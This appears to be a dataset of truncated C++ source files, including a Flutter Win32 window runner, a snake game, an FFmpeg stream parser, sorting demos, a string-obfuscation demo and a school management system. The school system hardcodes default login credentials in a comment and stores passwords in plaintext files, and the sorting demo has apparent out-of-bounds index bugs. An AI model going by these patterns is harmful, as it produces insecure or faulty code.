sColourBackgroundChoice == LWHT\n\t\t\t\t\t\t|| sColourBackgroundChoice == WHT)\n\t\t\t\t\t{\n\t\t\t\t\t\tsColourForegroundChoice = BLK;\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t// Colour relationship\n\t\t\t\tif (sColourBackgroundChoice == LWHT && sColourForegroundChoice == LYLW) {\n\t\t\t\t\tsColourForegroundChoice = BLK;\n\t\t\t\t}\n\t\t\t\telse if (sColourBackgroundChoice == LYLW && sColourForegroundChoice == LWHT) {\n\t\t\t\t\tsColo",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "/*\n** EPITECH PROJECT, 2023\n** B-OOP-400-BAR-4-1-arcade-thomas.fiancette\n** File description:\n** Nibller\n*/\n\n#include \"Nibbler.hpp\"\n\nNibbler::Nibbler()\n{\n    this->endlevel = 25;\n    this->life = 2;\n    this->nufapple = 3;\n    this->debug = false;\n    this->Level = 1;\n    this->appleEat = 0;\n    this->maxy = 23; // 20 default\n    this->maxx = 42; // 34 default\n    this->last_event_val = ' ';\n    this->score = 0;\n    this->head = 'B';\n    this->direction_x = 1;\n    this->direction_y = 0;\n    this->time = 500;\n    this->gamestate = GameState::RUNNING;\n}\n\nvoid Nibbler::printMapForGrap()\n{\n    for (auto p : this->map) {\n        for (auto x : p) {\n            printf(\"%c\", x);\n        }\n        printf(\"\\n\");\n    }\n}\n\nconst std::string& Nibbler::getName() const\n{\n    static const std::string name = \"Nibbler\";\n    return name;\n}\n\nvoid Nibbler::start(IDisplayModule *display)\n{\n    this->display = display;\n    this->starttnibller = std::chrono::high_resolution_clock::now();\n    this->timetnibller = std::chrono::high_resolution_clock::now();\n    this->startLevel(false);\n}\n\nvoid Nibbler::stop()\n{\n    this->gamestate = GameState::GAME_OVER;\n    return;\n}\n\nvoid Nibbler::startLevel(bool restart)\n{\n    if (restart == false && this->Level % 2 == 0)\n        this->nufapple++;\n    this->appleEat = 0;\n    std::map<std::size_t, nibbler_body> empty;\n    this->nibbler_bdy = empty;\n    this->map = this->getInitialMap(\"\");\n    this->addbody(this->x_head, this->y_head);\n    this->addbody(this->x_head, this->y_head);\n    this->addbody(this->x_head, this->y_head);\n    for (int x = 0; x < this->nufapple; x++) {\n        this->placeApple();\n    }\n    colors::Color c = colors::GREEN;\n    if (restart == true)\n        c = colors::RED;\n    this->cinematique(\"LEVEL \" + std::to_string(this->Level)\n        + \" LIFE: \" + std::to_string(this->life), 15, 10, 2, c);\n}\n\nvoid Nibbler::update(IDisplayModule *display)\n{\n    this->display = display;\n    this->display->setWindowSize(this->maxx, this->maxy);\n    this->handleEvent();\n    this->nibblerMoove();\n    std::chrono::duration<double, std::milli> dr = std::chrono::high_resolution_clock::now() - this->timetnibller;\n    if (dr.count() > 1000) {\n        this->time--;\n        if (this->time == 0) {\n            this->GameOver();\n        }\n        this->timetnibller = std::chrono::high_resolution_clock::now();\n    }\n}\n\nvoid Nibbler::render()\n{\n    this->display->clear();\n    this->display->drawSprite('?', {0, 0}, colors::WHITE);\n    this->display->drawMap(this->map);\n    this->display->drawText(\"Score: \" + std::to_string(this->score), {0, 0, 40}, colors::Colors::RED);\n    this->display->drawText(\"Time: \" + std::to_string(this->time),\n        {this->display->mapToWindow({10, 0})[0], 0, 40}, colors::Colors::RED);\n    this->display->drawText(\"Life: \" + std::to_string(this->life),\n        {this->display->mapToWindow({20, 0})[0], 0, 40}, colors::Colors::RED);\n    this->display->drawText(\"Level: \" + std::to_string(this->Level),\n        {this->display->mapToWindow({30, 0})[0], 0, 40}, colors::Colors::RED);\n    this->display->display();\n}\n\nvoid Nibbler::addbody(int x_tail, int y_tail)\n{\n    nibbler_body bd;\n    int temp_y = y_tail;\n    int temp_x = x_tail;\n    temp_y += this->direction_y * -1;\n    temp_x += this->direction_x * -1;\n    this->map[temp_y][temp_x] = 'Z';\n    bd.x_pos = temp_x;\n    bd.y_pos = temp_y;\n    if (this->nibbler_bdy.size() == 0) {\n        bd.order_x = this->head_old_x;\n        bd.order_y = this->head_old_y;\n    } else {\n        bd.order_x = this->nibbler_bdy[this->nibbler_bdy.size() -1].order_x;\n        bd.order_y = this->nibbler_bdy[this->nibbler_bdy.size() -1].order_y;\n    }\n    this->nibbler_bdy[this->nibbler_bdy.size()] = bd;\n    if (this->debug == true)\n        printf(\"Body size=%d\\n\", this->nibbler_bdy.size());\n}\n\nvoid Nibbler::bodyMoove()\n{\n    int chr = 'Z';\n    for (auto &body : this->nibbler_bdy) {\n        int old_x = body.second.x_pos;\n        int old_y = body.second.y_pos;\n        if (body.first != 0) {\n            body.second.x_pos = this->nibbler_bdy[body.first - 1].order_x;\n            body.second.y_pos = this->nibbler_bdy[body.first - 1].order_y;\n        } else {\n            body.second.x_pos = this->head_old_x;\n            body.second.y_pos = this->head_old_y;\n        }\n        chr = this->getSpriteDir(old_x - body.second.x_pos, old_y - body.second.y_pos);\n        body.second.order_x = old_x;\n        body.second.order_y = old_y;\n        this->map[body.second.y_pos][body.second.x_pos] = chr;\n        this->map[old_y][old_x] = ' ';\n    }\n}\n\nbool Nibbler::canMoove(int x, int y)\n{\n    if (this->map[this->y_head + y][this->x_head + x] == '!')\n        return false;\n    return true;\n}\n\nvoid Nibbler::mooveAuto(int x, int y)\n{\n    if (this->map[this->y_head - x][this->x_head - y] != '!') {\n        this->direction_x = y * -1;\n        this->direction_y = x * -1;\n        this->head = this->getHead(this->direction_x, this->direction_y);\n        this->checkifalive(this->x_head - y, this->y",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string>\n#include <iostream>\n#include <fcntl.h>\n#include <io.h>\nextern \"C\" {\n    #include <libavcodec/avcodec.h>\n    #include <libavformat/avformat.h>\n    #include <libavcodec/bsf.h>\n    #include <libswscale/swscale.h>\n}\n\n//#define DEV\n\nenum class MessageType : uint8_t {\n    PARAMETER = 0,\n    IMAGE_FRAME = 1,\n    SEI = 2,\n    END = 3\n};\n\nchar av_error[AV_ERROR_MAX_STRING_SIZE] = { 0 };\n#define av_err2str(errnum) av_make_error_string(av_error, AV_ERROR_MAX_STRING_SIZE, errnum)\n\nint main(int argc, char* argv[]) {\n    // \u8bbe\u7f6estdout\u4e3a\u4e8c\u8fdb\u5236\u6a21\u5f0f\uff0c\u5426\u5219\u7a0b\u5e8f\u4f1a\u8f6c\u4e49\u56fe\u50cf\u6570\u636e\u9020\u6210\u63a5\u6536\u7aef\u753b\u9762\u4ea7\u751f\u3010\u626d\u66f2/\u504f\u79fb\u3011\u5f02\u5e38\n#ifdef _WIN32\n    _setmode(_fileno(stdout), _O_BINARY);\n#else\n    freopen(NULL, \"wb\", stdout);\n#endif\n    AVFormatContext* fmt_ctx = NULL;\n    AVCodecContext* codec_ctx = NULL;\n    const AVCodec* codec = NULL;\n    const size_t message_type_size = 1;\n    const size_t parameter_type_size = 4;\n    const size_t sei_len_size = 4;\n    int ret;\n    //const char* url = \"E:/rtsp/rtsp.sei.flv\";\n#ifdef DEV\n    const char* url = \"rtmp://localhost/live/livestream\";\n#else\n    if (argc < 2) {\n        std::cerr << \"argc mismatch\" << std::endl;\n        std::cerr << \"Usage: ./ffmpeg_sei_parse rtmp_url\" << std::endl;\n        return 1;\n    }\n    const char* url = argv[1];\n#endif\n    avformat_network_init();\n    ret = avformat_open_input(&fmt_ctx, url, NULL, NULL);\n    if (ret < 0) {\n        fprintf(stderr, \"Error opening input file%s\\n\", av_err2str(ret));\n        return 1;\n    }\n\n    ret = avformat_find_stream_info(fmt_ctx, NULL);\n    if (ret < 0) {\n        fprintf(stderr, \"Error finding stream info: %s\\n\", av_err2str(ret));\n        return 1;\n    }\n\n    int video_stream_index = -1;\n    for (unsigned int i = 0; i < fmt_ctx->nb_streams; i++) {\n        if (fmt_ctx->streams[i]->codecpar->codec_type == AVMEDIA_TYPE_VIDEO) {\n            video_stream_index = static_cast<int>(i);\n            break;\n        }\n    }\n\n    if (video_stream_index == -1) {\n        std::cerr << \"Could not find video stream\" << std::endl;\n        avformat_close_input(&fmt_ctx);\n        return -1;\n    }\n\n    AVCodecParameters* codecParams = fmt_ctx->streams[video_stream_index]->codecpar;\n    uint32_t width = codecParams->width;\n    uint32_t height = codecParams->height;\n    MessageType message_type = MessageType::PARAMETER;\n    fwrite(&message_type, message_type_size, 1, stdout);\n    // \u5c06\u5bbd\u5ea6\u9ad8\u5ea6\u4f20\u9012\u7ed9\u63a5\u6536\u65b9\uff0c\u4ee5\u4fbf\u540e\u7eed\u77e5\u9053\u6bcf\u4e00\u5e27\u8981\u8bfb\u53d6\u591a\u5c11\u5b57\u8282\u7684\u56fe\u7247\u6570\u636e\n    fwrite(&width, parameter_type_size, 1, stdout);\n    fwrite(&height, parameter_type_size, 1, stdout);\n\n    codec = avcodec_find_decoder(fmt_ctx->streams[video_stream_index]->codecpar->codec_id);\n    if (!codec) {\n        fprintf(stderr, \"Codec not found\\n\");\n        return 1;\n    }\n\n    codec_ctx = avcodec_alloc_context3(codec);\n    if (!codec_ctx) {\n        fprintf(stderr, \"Could not allocate codec context\\n\");\n        return 1;\n    }\n\n    ret = avcodec_parameters_to_context(codec_ctx, fmt_ctx->streams[video_stream_index]->codecpar);\n    if (ret < 0) {\n        fprintf(stderr, \"Error setting codec parameters: %s\\n\", av_err2str(ret));\n        return 1;\n    }\n\n    ret = avcodec_open2(codec_ctx, codec, NULL);\n    if (ret < 0) {\n        fprintf(stderr, \"Error opening codec: %s\\n\", av_err2str(ret));\n        return 1;\n    }\n\n    av_dump_format(fmt_ctx, video_stream_index, url, 0);\n\n    AVPacket *pkt = av_packet_alloc();\n    pkt->data = NULL;\n    pkt->size = 0;\n    SwsContext* sws_ctx = NULL;\n    message_type = MessageType::IMAGE_FRAME;\n    while (av_read_frame(fmt_ctx, pkt) >= 0) {\n        if (pkt->stream_index == video_stream_index) {\n            AVFrame* frame = av_frame_alloc();\n            ret = avcodec_send_packet(codec_ctx, pkt);\n            if (ret < 0) {\n                fprintf(stderr, \"Error sending packet to decoder: %s\\n\", av_err2str(ret));\n                goto end;\n            }\n            while (avcodec_receive_frame(codec_ctx, frame) >= 0) {\n                AVFrameSideData* sei_sd = av_frame_get_side_data(frame, AV_FRAME_DATA_SEI_UNREGISTERED);\n                if (sei_sd) {\n                    message_type = MessageType::SEI;\n                    fwrite(&message_type, message_type_size, 1, stdout);\n                    uint32_t sei_len = strlen((char*)(sei_sd->data + 16));\n                    fwrite(&sei_len, sei_len_size, 1, stdout);\n                    fwrite(sei_sd->data + 16, sei_len, 1, stdout);\n                    fflush(stdout);\n                    //fprintf(stdout, \"SEI Data:\\n\");\n                    //std::cout << sei_sd->data + 16 << std::endl;\n                }\n                if (!sws_ctx) {\n                    sws_ctx = sws_getContext(frame->width, frame->height, (AVPixelFormat)frame->format,\n                        frame->width, frame->height, AV_PIX_FMT_BGR24,\n                        SWS_BILINEAR, NULL, NULL, NULL);\n                    if (!sws_ctx) {\n                        fprintf(stderr, \"Failed to initialize SwsContext for image conversion\\n\");\n                        goto end;\n                    }\n          ",
    "#include <iostream>\n#include <algorithm>\n#include <format>\n#include \"ListOperationsKit.h\"\n\nvoid quick_sort(int begin, int end, ListOperationsKit<int>& list) {\n    if(begin < end) {\n        int i = begin, j = end, pivot = list.get(begin);\n        do {\n            while (list[i] < pivot) ++i;\n            while (list[j] > pivot) --j;\n            if (i <= j) {\n                list.swap(i, j);\n                ++i;\n                --j;\n            }\n        } while(i <= j);\n        quick_sort(begin, j, list);\n        quick_sort(i, end, list);\n    }\n}\n\nvoid merge(int begin, int mid, int end, ListOperationsKit<int>& list) {\n    int i = begin, j = mid + 1, k = 0;\n    ListOperationsKit<int> temp;\n    while (i <= mid && j <= end) {\n        if (list.get(i) < list[j]) {\n            temp.append(list[i]);\n            ++i;\n        } else {\n            temp.append(list[j]);\n            ++j;\n        }\n    }\n    while (i <= mid) {\n        temp.append(list[i]);\n        ++i;\n    }\n    while (j <= end) {\n        temp.append(list[j]);\n        ++j;\n    }\n    for (int n = begin; n <= end; ++n) {\n        list[n] = temp[k];\n        ++k;\n    }\n}\n\nvoid merge_sort(int begin, int end, ListOperationsKit<int>& list) {\n    if (begin < end) {\n        int mid = (begin + end) / 2;\n        merge_sort(begin, mid, list);\n        merge_sort(mid + 1, end, list);\n        merge(begin, mid, end, list);\n    }\n}\n\nvoid stooge_sort(int begin, int end, ListOperationsKit<int>& list) {\n    if (list.get(begin) > list(end)) {\n        list.swap(begin, end);\n    }\n    if (end - begin + 1 > 2) {\n        int t = (end - begin + 1) / 3;\n        stooge_sort(begin, end - t, list);\n        stooge_sort(begin + t, end, list);\n        stooge_sort(begin, end - t, list);\n    }\n}\n\nint main() {\n    ListOperationsKit<int> list_1, list_2, list_3;\n\n    list_1.random_append(10);\n    list_2.random_append(10, 2, 50);\n    list_3.append(99, 53, 21, 8, 9, 10, 11, 12, 65, 94);\n\n    std::cout << list_1 << std::endl;\n    std::cout << list_2 << std::endl;\n    std::cout << list_3 << std::endl;\n\n    std::cout << std::endl;\n\n    quick_sort(0, list_1.length(), list_1);\n    merge_sort(0, list_2.length(), list_2);\n    stooge_sort(0, list_3.length(), list_3);\n\n    std::cout << list_1 << std::endl;\n    std::cout << list_2 << std::endl;\n    std::cout << list_3 << std::endl;\n\n    return 0;\n}",
    "#include \"secret_string.hpp\"\n\n#include <fmt/core.h>\n#include <fmt/ranges.h>\n\n#include <bit>\n#include <string_view>\n#include <ranges>\n\nstruct Obfuscator\n{\n    static constexpr secret_string::SecretString s_key{ \"O76U4CR6u4cov8l7ivto6RVuyo68eiUB6q23r287I65v\" };\n\n    static constexpr std::size_t s_seed = []() consteval {\n        std::size_t seed = 0;\n        for (auto c : __TIME__) {\n            seed <<= 8;\n            seed  |= (std::size_t)c;\n        }\n        return seed;\n    }() % s_key.size();\n\n    constexpr char encrypt(char c) const { return c ^ s_key.view()[s_seed]; }\n    char           decrypt(char c) const { return c ^ s_key.view()[s_seed]; }\n};\n\nstatic_assert(secret_string::ObfuscatorConcept<Obfuscator>);\n\ntemplate <std::size_t N>\nusing Secret = secret_string::SecretString<N, Obfuscator>;\n\ntemplate <secret_string::FixedString Str>\nconsteval auto operator\"\"_secret()\n{\n    return Secret<Str.size()>{ Str };\n}\n\nint main()\n{\n    namespace sv = std::views;\n\n    constexpr std::string_view regular{ \"A regular string literal\" };    // show up in the built binary as is\n    fmt::println(\"regular      : {:?}\", regular);\n\n    constexpr auto secret = \"A secret string literal\"_secret;    // show up in the built binary but obfuscated\n    fmt::println(\"secret (view): {:?}\", secret.view());\n    fmt::println(\"secret (read): {:?}\", secret.read());\n\n    const auto bytesView = secret.view() | sv::transform(std::bit_cast<std::byte, char>);\n    fmt::println(\"bytes view   : {:02x}\", fmt::join(bytesView, \"\"));\n    fmt::println(\"               {:02x} (reversed)\", fmt::join(bytesView | sv::reverse, \"\"));\n}\n",
    "//TO FIRST TIME RUN THE PROGRAM TO TEST:\r\n//\r\n//FOR STUDENT:-\r\n//USERNAME: GORDON123\r\n//PASSWORD: JLJIJJIJJ345\r\n//\r\n//FOR TEACHER:-\r\n//USERNAME: HAPO1234\r\n//PASSWORD: PASS1234\r\n//\r\n//FOR ADMIN:-\r\n//USERNAME: Admin\r\n//PASSWORD: Admin123\r\n\r\n#include \"Database.hpp\"\r\n//--------------------Admin Class Functions--------------------\r\nvoid Admin::signin() {\r\n\tchar f;\r\n\tbool found = false;\r\n\tifstream file(\"Admin.txt\");\r\n\tif (!file.is_open()) {\r\n\t\tcout << \"Error! Unable to open file.\\n\";\r\n\t\treturn;\r\n\t}\r\n\r\n\tstring user, pass, username, password;\r\n\tcout << \"PLEASE INPUT THE USERNAME:    \";\r\n\tcin >> username;\r\n\tcout << \"PLEASE INPUT THE PASSWORD:    \";\r\n\tcin >> password;\r\n\r\n\twhile (getline(file, user, ',')) {\r\n\t\tgetline(file, pass);\r\n\r\n\t\tif (username == user && password == pass) {\r\n\t\t\tfound = true;\r\n\t\t\tbreak;\r\n\t\t}\r\n\t}\r\n\r\n\tif (found) {\r\n\t\tcout << \"THE USERNAME AND PASSWORD ARE CORRECT\" << endl;\r\n\t\tcout << \"YOU CAN PROCEED\" << endl;\r\n\t\tcout << \"PRESS ANY KEY TO CONTINUE\" << endl;\r\n\t\tf = _getch();\r\n\t\tfile.close();\r\n\r\n\t\tchar j = 'y';\r\n\t\twhile (j != 8)\r\n\t\t{\r\n\t\t\tsystem(\"cls\");\r\n\t\t\tsystem(\"Color C7\");\r\n\t\t\tcout << endl << \"1.    PRESS 1 TO ADD TEACHER\" << endl;\r\n\t\t\tcout << \"2.    PRESS 2 TO ADD STUDENT\" << endl;\r\n\t\t\tcout << \"3.    PRESS 3 TO EDIT TEACHER\" << endl;\r\n\t\t\tcout << \"4.    PRESS 4 TO EDIT STUDENT\" << endl;\r\n\t\t\tcout << \"5.    PRESS 5 TO VIEW ALL TEACHERS\" << endl;\r\n\t\t\tcout << \"6.    PRESS 6 TO VIEW ALL STUDENTS\" << endl;\r\n\t\t\tcout << \"7.    PRESS BACKSPACE <------ TO EXIT ADMIN MODULE\" << endl;\r\n\t\t\tj = _getch();\r\n\t\t\tif (j == '1')\r\n\t\t\t{\r\n\t\t\t\taddteacher();\r\n\t\t\t}\r\n\t\t\telse if (j == '2')\r\n\t\t\t{\r\n\t\t\t\taddstudent();\r\n\t\t\t}\r\n\t\t\telse if (j == '3')\r\n\t\t\t{\r\n\t\t\t\teditteacher();\r\n\t\t\t}\r\n\t\t\telse if (j == '4')\r\n\t\t\t{\r\n\t\t\t\teditstudent();\r\n\t\t\t}\r\n\t\t\telse if (j == '5')\r\n\t\t\t{\r\n\t\t\t\tviewteacher();\r\n\t\t\t}\r\n\t\t\telse if (j == '6')\r\n\t\t\t{\r\n\t\t\t\tviewstudent();\r\n\t\t\t}\r\n\t\t\telse if (j != 8)\r\n\t\t\t{\r\n\t\t\t\tcout << endl << \"PLEASE PRESS VALID NUMBER\" << endl;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\telse {\r\n\t\tcout << \"USERNAME OR PASSWORD IS INCORRECT\" << endl;\r\n\t}\r\n\r\n}\r\nvoid Admin::addteacher()\r\n{\r\n\tchar f;\r\n\tcout << \"PLEASE INPUT THE ID OF TEACHER    \";\r\n\tcin >> t_id;\r\n\tcout << \"PLEASE INPUT THE FIRST NAME OF TEACHER    \";\r\n\tcin >> t_firstname;\r\n\tcout << \"PLEASE INPUT THE LAST NAME OF TEACHER    \";\r\n\tcin >> t_lastname;\r\n\tcout << \"PLEASE INPUT THE DEPARTMENT OF TEACHER    \";\r\n\tcin >> t_department;\r\n\tcout << \"PLEASE INPUT THE USER NAME OF TEACHER    \";\r\n\tcin >> tuser_name;\r\n\tcout << \"PLEASE INPUT THE PASSWORD OF TEACHER    \";\r\n\tcin >> tpassword;\r\n\tcout << \"PLEASE INPUT THE REGISTERATION DATE OF TEACHER    \";\r\n\tcin >> date;\r\n\tcout << \"PLEASE INPUT THE GENDER OF TEACHER    \";\r\n\tcin >> t_gender;\r\n\tcout << \"PLEASE INPUT THE NUMBER OF TEACHER    \";\r\n\tcin >> t_number;\r\n\tcout << \"PLEASE INPUT THE QUALIFICATION OF TEACHER    \";\r\n\tcin >> t_qualification;\r\n\tcout << \"PLEASE INPUT THE CITY OF TEACHER AS ADDRESS    \";\r\n\tcin >> address;\r\n\tofstream out(\"Teacher.txt\", ios::app);  // Open file in append mode\r\n\tout << t_id << \",\" << t_firstname << \",\" << t_lastname << \",\" << t_department << \",\" << tuser_name << \",\" << tpassword << \",\" << date << \",\" << t_gender << \",\" << t_number << \",\" << t_qualification << \",\" << address << endl;\r\n\tout.close();  // Remember to close the file\r\n\tcout << endl << \"THE DATA OF TEACHER HAS BEEN ADDED\" << endl;\r\n\tcout << \"PRESS ANY KEY TO CONTINUE\" << endl;\r\n\tf = _getch();\r\n}\r\nvoid Admin::addstudent()\r\n{\r\n\tchar f;\r\n\tcout << \"PLEASE INPUT THE ID OF STUDENT    \";\r\n\tcin >> s_id;\r\n\tcout << \"PLEASE INPUT THE FIRST NAME OF STUDENT    \";\r\n\tcin >> s_firstname;\r\n\tcout << \"PLEASE INPUT THE LAST NAME OF STUDENT    \";\r\n\tcin >> s_lastname;\r\n\tcout << \"PLEASE INPUT THE DEPARTMENT OF STUDENT    \";\r\n\tcin >> s_department;\r\n\tcout << \"PLEASE INPUT THE ROLL NUMBER OF STUDENT    \";\r\n\tcin >> rollno;\r\n\tcout << \"PLEASE INPUT THE USER NAME OF STUDENT    \";\r\n\tcin >> suser_name;\r\n\tcout << \"PLEASE INPUT THE PASSWORD OF STUDENT    \";\r\n\tcin >> spassword;\r\n\tcout << \"PLEASE INPUT THE REGISTERATION DATE OF STUDENT    \";\r\n\tcin >> s_date;\r\n\tcout << \"PLEASE INPUT THE GENDER OF STUDENT    \";\r\n\tcin >> s_gender;\r\n\tcout << \"PLEASE INPUT THE NUMBER OF STUDENT   \";\r\n\tcin >> s_number;\r\n\tcout << \"PLEASE INPUT THE CITY OF STUDENT AS ADDRESS    \";\r\n\tcin >> s_address;\r\n\tcout << \"PLEASE INPUT THE FEE STATUS OF STUDENT    \";\r\n\tcin >> fee;\r\n\tcout << \"PLEASE INPUT THE QUALIFICATION OF STUDENT    \";\r\n\tcin >> s_qualification;\r\n\tcout << \"PLEASE INPUT THE MARKS OF STUDENT    \";\r\n\tcin >> s_marks;\r\n\tofstream out(\"Student.txt\", ios::app);  // Open file in append mode\r\n\tout << s_id << \",\" << s_firstname << \",\" << s_lastname << \",\" << s_department << \",\" << rollno << \",\" << suser_name << \",\" << spassword << \",\" << s_date << \",\" << s_gender << \",\" << s_number << \",\" << s_address << \",\" << fee << \",\" << s_qualification << \",\" << s_marks << endl;\r\n\tout.close();\r\n\tcout << endl << \"THE DATA OF STUDENT HAS BEEN ADDED\" << endl;\r\n\tcout << \"PRESS ANY KEY TO CONTINUE\" << endl;\r\n\tf = _getch();\r\n}\r\nvoid Admin::editstudent()\r\n{\r\n\tchar f;\r\n\tfstream file",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    